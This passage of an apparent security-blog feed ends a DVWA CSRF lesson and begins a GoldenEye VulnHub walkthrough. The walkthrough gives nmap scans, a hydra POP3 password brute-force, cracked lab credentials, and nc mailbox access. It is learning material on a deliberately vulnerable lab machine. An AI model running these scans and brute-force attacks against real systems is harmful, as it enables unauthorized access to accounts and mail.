data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token comment\">// Update database with new password</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$db</span><span class=\"token operator\">-></span><span class=\"token function\">prepare</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'UPDATE users SET password = (:password) WHERE user = (:user);'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">bindParam</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">':password'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$pass_new</span><span class=\"token punctuation\">,</span> <span class=\"token class-name static-context\">PDO</span><span class=\"token operator\">::</span><span class=\"token constant\">PARAM_STR</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">bindParam</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">':user'</span><span class=\"token punctuation\">,</span> <span class=\"token function\">dvwaCurrentUser</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token class-name static-context\">PDO</span><span class=\"token operator\">::</span><span class=\"token constant\">PARAM_STR</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token comment\">// Feedback for the user</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;pre>Password Changed.&lt;/pre>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        <span class=\"token comment\">// Issue with passwords matching</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;pre>Passwords did not match or current password incorrect.&lt;/pre>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token comment\">// Generate Anti-CSRF token</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token function\">generateSessionToken</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><ol>\n<li>增加 token 检测</li>\n<li>需要知道当前密码才能修改密码</li>\n<li><code>stripslashes</code>  函数去除可能存在的反斜杠</li>\n<li><code>mysqli_real_escape_string</code>  函数进行转义，以防止 SQL 注入攻击</li>\n<li>使用  <code>md5</code>  函数对密码进行了哈希处理</li>\n<li><code>bindParam()</code>  函数用于绑定参数，其中的第三个参数 <code>(PDO::PARAM_STR)</code>  指定了参数的数据类型为字符串。这样可以防止 SQL 注入攻击</li>\n</ol>\n<h3 id=\"总结-3\"><a class=\"anchor\" href=\"#总结-3\">#</a> 总结</h3>\n<p>这一章学习了 CSRF 漏洞以及如何防范：</p>\n<ul>\n<li>无 CSRF 防护，恶意链接，短链接</li>\n<li>referer 混淆的恶意链接</li>\n<li>配合 xss，编写 js 获取 token\n<ul>\n<li>很多文章的一些方法，因为同源策略已经失效</li>\n</ul>\n</li>\n<li>CSRF 防范\n<ul>\n<li>token</li>\n<li>知道当前密码才能改</li>\n</ul>\n</li>\n</ul>\n",
            "tags": [
                "靶场",
                "基础靶场",
                "Web安全",
                "打靶",
                "DVWA"
            ]
        },
        {
            "id": "https://ph0ven1x.github.io/2024/05/15/GoldenEye-v1-%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/",
            "url": "https://ph0ven1x.github.io/2024/05/15/GoldenEye-v1-%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/",
            "title": "GoldenEye v1 靶场渗透",
            "date_published": "2024-05-15T02:25:11.000Z",
            "content_html": "<h1 id=\"1-goldeneye-v1-靶场渗透\"><a class=\"anchor\" href=\"#1-goldeneye-v1-靶场渗透\">#</a> 1-GoldenEye v1 靶场渗透</h1>\n<p>靶场地址：<a href=\"https://www.vulnhub.com/entry/goldeneye-1,240/\">https://www.vulnhub.com/entry/goldeneye-1,240/</a></p>\n<p>目标：获取 root 权限并捕获秘密的 GoldenEye 代码 - flag.txt。</p>\n<h2 id=\"1信息收集-密码爆破\"><a class=\"anchor\" href=\"#1信息收集-密码爆破\">#</a> 1. 信息收集、密码爆破</h2>\n<p>使用 <code>nmap</code>  扫描 C 段主机存活情况。</p>\n<p>本机 IP：192.168.222.133  靶机 IP：192.168.222.130</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>nmap <span class=\"token parameter variable\">-sP</span> <span class=\"token number\">192.168</span>.222.0/24</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Starting Nmap <span class=\"token number\">7</span>.94SVN <span class=\"token punctuation\">(</span> https://nmap.org <span class=\"token punctuation\">)</span> at <span class=\"token number\">2024</span>-05-13 09:44 EDT</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Nmap scan report <span class=\"token keyword\">for</span> DESKTOP-AACP4RA.mshome.net <span class=\"token punctuation\">(</span><span class=\"token number\">192.168</span>.222.1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Host is up <span class=\"token punctuation\">(</span><span class=\"token number\">0</span>.00017s latency<span class=\"token punctuation\">)</span>.</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>MAC Address: 00:50:56:C0:00:01 <span class=\"token punctuation\">(</span>VMware<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Nmap scan report <span class=\"token keyword\">for</span> <span class=\"token number\">192.168</span>.222.130</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Host is up <span class=\"token punctuation\">(</span><span class=\"token number\">0</span>.000095s latency<span class=\"token punctuation\">)</span>.</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>MAC Address: 00:0C:29:2E:AC:12 <span class=\"token punctuation\">(</span>VMware<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Nmap scan report <span class=\"token keyword\">for</span> <span class=\"token number\">192.168</span>.222.254</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>Host is up <span class=\"token punctuation\">(</span><span class=\"token number\">0</span>.000092s latency<span class=\"token punctuation\">)</span>.</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>MAC Address: 00:50:56:E8:F5:23 <span class=\"token punctuation\">(</span>VMware<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>Nmap scan report <span class=\"token keyword\">for</span> <span class=\"token number\">192.168</span>.222.133</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>Host is up.</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>Nmap done: <span class=\"token number\">256</span> IP addresses <span class=\"token punctuation\">(</span><span class=\"token number\">4</span> hosts up<span class=\"token punctuation\">)</span> scanned <span class=\"token keyword\">in</span> <span class=\"token number\">3.99</span> seconds</pre></td></tr></table></figure><p>简单扫描一下靶机 IP，发现 <code>25</code>  和 <code>80</code>  端口开放</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>nmap <span class=\"token number\">192.168</span>.222.130</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Starting Nmap <span class=\"token number\">7</span>.94SVN <span class=\"token punctuation\">(</span> https://nmap.org <span class=\"token punctuation\">)</span> at <span class=\"token number\">2024</span>-05-13 09:45 EDT</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Nmap scan report <span class=\"token keyword\">for</span> <span class=\"token number\">192.168</span>.222.130</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Host is up <span class=\"token punctuation\">(</span><span class=\"token number\">0</span>.000091s latency<span class=\"token punctuation\">)</span>.</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Not shown: <span class=\"token number\">998</span> closed tcp ports <span class=\"token punctuation\">(</span>reset<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>PORT   STATE SERVICE</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token number\">25</span>/tcp <span class=\"token function\">open</span>  smtp</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token number\">80</span>/tcp <span class=\"token function\">open</span>  http</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>MAC Address: 00:0C:29:2E:AC:12 <span class=\"token punctuation\">(</span>VMware<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>Nmap done: <span class=\"token number\">1</span> IP address <span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token function\">host</span> up<span class=\"token punctuation\">)</span> scanned <span class=\"token keyword\">in</span> <span class=\"token number\">1.26</span> seconds</pre></td></tr></table></figure><p>有 <code>80</code>  端口，打开网站 <code>192.168.222.130</code>  看看。</p>\n<p><img loading=\"lazy\" data-src=\"image-20240513214729508.png\" alt=\"image-20240513214729508\" /></p>\n<p>说发现一个目录可以登录： <code>192.168.222.130/sev-home/</code></p>\n<p>进入后弹出登录的对话框，但是没有账号和密码</p>\n<p>右键看一下 192.168.222.130 的源码，发现 terminal.js 文件</p>\n<p><img loading=\"lazy\" data-src=\"image-20240513214950343.png\" alt=\"image-20240513214950343\" /></p>\n<p>查看 terminal.js 文件，得到一些信息</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">//Boris, make sure you update your default password. </span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">//My sources say MI6 maybe planning to infiltrate. </span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">//Be on the lookout for any suspicious network traffic....</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">//I encoded you p@ssword below...</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">//&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">//BTW Natalya says she can break your codes</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>翻译：</pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">//Boris，请确保更新您的默认密码。</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">// 我的消息来源说军情六处可能计划渗透。</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\">// 留意任何可疑的网络流量......</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\">// 我在下面给你编码了密码</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">//&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\">// 顺便说一句，Natalya 说她可以破解你的密码</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\">//</span></pre></td></tr></table></figure><p>关键信息：</p>\n<p><code>Boris</code> 、 <code>Natalya</code> 、 <code>&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;</code></p>\n<p><code>&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;</code></p>\n<p>HTML 加密，解密得到密码：InvincibleHack3r</p>\n<p>根据上文，这应该时 Boris 的密码，Boris,InvincibleHack3r 尝试登录，登录失败</p>\n<p>尝试用户名小写 boris, 再次登录，登录成功～</p>\n<p><img loading=\"lazy\" data-src=\"image-20240513215436982.png\" alt=\"image-20240513215436982\" /></p>\n<p>页面显示信息：</p>\n<pre><code>GoldenEye\n\nGoldenEye is a Top Secret Soviet oribtal weapons project. Since you have access you definitely hold a Top Secret clearance and qualify to be a certified GoldenEye Network Operator (GNO)\n\nPlease email a qualified GNO supervisor to receive the online GoldenEye Operators Training to become an Administrator of the GoldenEye system\n\nRemember, since security by obscurity is very effective, we have configured our pop3 service to run on a very high non-default port\n\n黄金眼\n\n“黄金眼”是苏联的绝密轨道武器项目。既然您拥有访问权限，那么您肯定拥有绝密许可，并且有资格成为经过认证的黄金眼网络操作员 (GNO)\n\n请向合格的 GNO 主管发送电子邮件以接收在线黄金眼操作员培训，成为黄金眼系统的管理员\n\n请记住，由于隐匿性安全非常有效，因此我们已将 pop3 服务配置为在非常高的非默认端口上运行\n\n\n</code></pre>\n<p>关键信息： <strong>pop3 服务配置为在非常高的非默认端口上运行</strong></p>\n<p>我们之前没有扫到 pop3 的端口，现在使用 nmap 进行全端口扫描。</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>nmap -p- <span class=\"token number\">192.168</span>.222.130</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Starting Nmap <span class=\"token number\">7</span>.94SVN <span class=\"token punctuation\">(</span> https://nmap.org <span class=\"token punctuation\">)</span> at <span class=\"token number\">2024</span>-05-13 09:56 EDT</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Nmap scan report <span class=\"token keyword\">for</span> <span class=\"token number\">192.168</span>.222.130</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Host is up <span class=\"token punctuation\">(</span><span class=\"token number\">0</span>.00079s latency<span class=\"token punctuation\">)</span>.</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Not shown: <span class=\"token number\">65531</span> closed tcp ports <span class=\"token punctuation\">(</span>reset<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>PORT      STATE SERVICE</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token number\">25</span>/tcp    <span class=\"token function\">open</span>  smtp</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token number\">80</span>/tcp    <span class=\"token function\">open</span>  http</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token number\">55006</span>/tcp <span class=\"token function\">open</span>  unknown</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token number\">55007</span>/tcp <span class=\"token function\">open</span>  unknown</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>MAC Address: 00:0C:29:2E:AC:12 <span class=\"token punctuation\">(</span>VMware<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>Nmap done: <span class=\"token number\">1</span> IP address <span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token function\">host</span> up<span class=\"token punctuation\">)</span> scanned <span class=\"token keyword\">in</span> <span class=\"token number\">1.88</span> seconds</pre></td></tr></table></figure><p>发现未知的 55006 和 55007 端口，进一步针对这两个端口进行扫描</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>nmap -p55006,55007 <span class=\"token number\">192.168</span>.222.130 <span class=\"token parameter variable\">-sS</span> <span class=\"token parameter variable\">-sV</span> <span class=\"token parameter variable\">-T5</span> <span class=\"token parameter variable\">-A</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Starting Nmap <span class=\"token number\">7</span>.94SVN <span class=\"token punctuation\">(</span> https://nmap.org <span class=\"token punctuation\">)</span> at <span class=\"token number\">2024</span>-05-13 <span class=\"token number\">10</span>:02 EDT</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Nmap scan report <span class=\"token keyword\">for</span> <span class=\"token number\">192.168</span>.222.130</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Host is up <span class=\"token punctuation\">(</span><span class=\"token number\">0</span>.00028s latency<span class=\"token punctuation\">)</span>.</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>PORT      STATE SERVICE  VERSION</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token number\">55006</span>/tcp <span class=\"token function\">open</span>  ssl/pop3 Dovecot pop3d</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token operator\">|</span>_ssl-date: TLS randomness does not represent <span class=\"token function\">time</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token operator\">|</span> ssl-cert: Subject: <span class=\"token assign-left variable\">commonName</span><span class=\"token operator\">=</span>localhost/organizationName<span class=\"token operator\">=</span>Dovecot mail server</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token operator\">|</span> Not valid before: <span class=\"token number\">2018</span>-04-24T03:23:52</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token operator\">|</span>_Not valid after:  <span class=\"token number\">2028</span>-04-23T03:23:52</pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token operator\">|</span>_pop3-capabilities: SASL<span class=\"token punctuation\">(</span>PLAIN<span class=\"token punctuation\">)</span> PIPELINING TOP CAPA <span class=\"token environment constant\">USER</span> RESP-CODES AUTH-RESP-CODE UIDL</pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token number\">55007</span>/tcp <span class=\"token function\">open</span>  pop3     Dovecot pop3d</pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token operator\">|</span> ssl-cert: Subject: <span class=\"token assign-left variable\">commonName</span><span class=\"token operator\">=</span>localhost/organizationName<span class=\"token operator\">=</span>Dovecot mail server</pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token operator\">|</span> Not valid before: <span class=\"token number\">2018</span>-04-24T03:23:52</pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token operator\">|</span>_Not valid after:  <span class=\"token number\">2028</span>-04-23T03:23:52</pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token operator\">|</span>_ssl-date: TLS randomness does not represent <span class=\"token function\">time</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token operator\">|</span>_pop3-capabilities: PIPELINING AUTH-RESP-CODE STLS RESP-CODES SASL<span class=\"token punctuation\">(</span>PLAIN<span class=\"token punctuation\">)</span> TOP CAPA <span class=\"token environment constant\">USER</span> UIDL</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>MAC Address: 00:0C:29:2E:AC:12 <span class=\"token punctuation\">(</span>VMware<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>Warning: OSScan results may be unreliable because we could not <span class=\"token function\">find</span> at least <span class=\"token number\">1</span> <span class=\"token function\">open</span> and <span class=\"token number\">1</span> closed port</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>Device type: general purpose</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>Running: Linux <span class=\"token number\">3</span>.X<span class=\"token operator\">|</span><span class=\"token number\">4</span>.X</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>OS details: Linux <span class=\"token number\">3.2</span> - <span class=\"token number\">4.9</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>Network Distance: <span class=\"token number\">1</span> hop</pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>TRACEROUTE</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>HOP RTT     ADDRESS</pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token number\">1</span>   <span class=\"token number\">0.28</span> ms <span class=\"token number\">192.168</span>.222.130</pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class=\"token builtin class-name\">.</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>Nmap done: <span class=\"token number\">1</span> IP address <span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token function\">host</span> up<span class=\"token punctuation\">)</span> scanned <span class=\"token keyword\">in</span> <span class=\"token number\">27.22</span> seconds</pre></td></tr></table></figure><p>关键信息：</p>\n<p><strong>55006：ssl/pop3：mail server</strong></p>\n<p><strong>55007：pop3：mail server</strong></p>\n<p>发现 55006 和 55007 都是 pop3，用作邮件服务的。</p>\n<p>考虑用 hydra 爆破 pop3</p>\n<p>目前收集了两个用户名：boris、natalya，先将他们写进 users.txt</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token parameter variable\">-e</span> <span class=\"token string\">'natalya\\nboris'</span> <span class=\"token operator\">></span> users.txt</pre></td></tr></table></figure><p>然后用九头蛇爆破 pop3，密码字典用 kali 自带的</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>hydra <span class=\"token parameter variable\">-L</span> users.txt <span class=\"token parameter variable\">-P</span> /usr/share/wordlists/fasttrack.txt <span class=\"token number\">192.168</span>.222.130 <span class=\"token parameter variable\">-s</span> <span class=\"token number\">55007</span> pop3  </pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token number\">55007</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>pop3<span class=\"token punctuation\">]</span> host: <span class=\"token number\">192.168</span>.222.130   login: natalya   password: bird </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token number\">55007</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>pop3<span class=\"token punctuation\">]</span> host: <span class=\"token number\">192.168</span>.222.130   login: boris   password: secret1<span class=\"token operator\">!</span></pre></td></tr></table></figure><p>成功爆破出密码</p>\n<p><code>login: natalya   password: bird</code></p>\n<p><code>login: boris   password: secret1!</code></p>\n<p>尝试使用 nc 登录邮箱： <code>nc 192.168.222.130 55007</code></p>\n<p>先登录 boris 邮箱  <code>user boris</code>   <code>pass secret1!</code></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token number\">192.168</span>.222.130 <span class=\"token number\">55007</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>+OK GoldenEye POP3 Electronic-Mail System</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>user boris</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>+OK</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>pass secret1<span class=\"token operator\">!</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>+OK Logged in.</pre></td></tr></table></figure><p>输入 <code>list</code>  查看邮件列表</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>list</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>+OK <span class=\"token number\">3</span> messages:</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token number\">1</span> <span class=\"token number\">544</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token number\">2</span> <span class=\"token number\">373</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token number\">3</span> <span class=\"token number\">921</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token builtin class-name\">.</span></pre></td></tr></table></figure><p><code>retr 1</code>  阅读第一封邮件</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>retr <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>+OK <span class=\"token number\">544</span> octets</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Return-Path: <span class=\"token operator\">&lt;</span>root@127.0.0.1.goldeneye<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>X-Original-To: boris</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Delivered-To: boris@ubuntu</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Received: from ok <span class=\"token punctuation\">(</span>localhost <span class=\"token punctuation\">[</span><span class=\"token number\">127.0</span>.0.1<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        by ubuntu <span class=\"token punctuation\">(</span>Postfix<span class=\"token punctuation\">)</span> with SMTP <span class=\"token function\">id</span> D9E47454B1</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">for</span> <span class=\"token operator\">&lt;</span>boris<span class=\"token operator\">></span><span class=\"token punctuation\">;</span> Tue, <span class=\"token number\">2</span> Apr <span class=\"token number\">1990</span> <span class=\"token number\">19</span>:22:14 <span class=\"token parameter variable\">-0700</span> <span class=\"token punctuation\">(</span>PDT<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Message-Id: <span class=\"token operator\">&lt;</span><span class=\"token number\">20180425022326</span>.D9E47454B1@ubuntu<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>Date: Tue, <span class=\"token number\">2</span> Apr <span class=\"token number\">1990</span> <span class=\"token number\">19</span>:22:14 <span class=\"token parameter variable\">-0700</span> <span class=\"token punctuation\">(</span>PDT<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>From: root@127.0.0.1.goldeneye</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>Boris, this is admin. You can electronically communicate to co-workers and students here. I'm not going to scan emails or security risks because I trust you and the other admins here.</pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>Boris，我是管理员。您可以在这里与同事和学生进行电子交流。我不会扫描电子邮件或安全风险，因为我信任您和这里的其他管理员。</pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>来自：root@127.0.0.1.goldeneye</pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token builtin class-name\">.</span></pre></td></tr></table></figure><p><code>retr 2</code>  阅读第二封邮件</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>retr <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>+OK <span class=\"token number\">373</span> octets</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Return-Path: <span class=\"token operator\">&lt;</span>natalya@ubuntu<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>X-Original-To: boris</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Delivered-To: boris@ubuntu</pre></td></tr><tr><td 